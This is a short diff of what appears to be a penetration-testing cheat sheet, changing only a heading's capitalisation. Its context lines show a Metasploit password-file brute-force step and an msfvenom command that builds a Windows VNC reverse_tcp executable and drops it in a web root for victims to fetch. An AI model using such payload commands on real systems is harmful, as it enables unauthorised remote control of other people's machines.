@@ -30,7 +30,7 @@ msf > set pass_file /your/dictionary/file
 msf > run
 ```
 
-### MSFVenom vnc payload
+### MSFVenom VNC payload
 ```
 msfvenom -p windows/vncinject/reverse_tcp lhost=[your_ip] lport=[your_port] -f exe > /var/www/html/vnc.exe
 
